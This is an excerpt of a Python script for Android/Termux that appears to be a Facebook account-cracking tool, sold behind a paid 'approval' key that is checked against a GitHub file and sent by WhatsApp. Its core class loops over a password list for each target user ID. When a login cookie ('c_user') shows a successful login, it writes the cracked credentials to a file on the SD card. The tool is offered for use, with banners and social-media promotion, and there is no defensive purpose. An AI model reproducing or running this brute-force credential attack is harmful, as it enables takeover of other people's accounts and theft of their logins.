...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+8801310303638?text=' + tks)

        

    r1=requests.get("https://github.com/A1k2SH main/approval.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL CYBER")     
        ...
        os.system('am start https://wa.me/+8801792112896t?text=' + tks)
...
\t   \033[31;42mCYBET\33[0;m\__😘😈

    
  [\x1b[1;95m+\x1b[1;97m] AUTHOR : C.E.O AKASH 
  [\x1b[1;95m+\x1b[1;97m] GITHUB : https://github.com/A1k2SH   
  [\x1b[1;95m+\x1b[1;97m] FACEBOOK : 𝐂 𝐄 𝐎____________ 3:)___\⓿❷❸ :* 3:)__ :* 3:) 〤 
  [\x1b[1;95m+\x1b[1;97m] YOU TUBE : ❝✰ CYBER-ATTACK❞ ❾❾                       
...
def R():
			...
			print("\033[1;93m{4}\033[1;97m ➟ \033[1;91mFOLLEW MY FACEBOOK  ID : 😽")
			print ('\033[1;92m༄•───────────────────────────────────────•༄')
			key = input(" [*] Choose : ")
			print ('༄•───────────────────────────────────────•༄')
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/tor.dad.is.akash.vau922")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[CYBER]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        open('/sdcard/CYBER_CP.txt' , 'a').write('%s\n' % wrt)
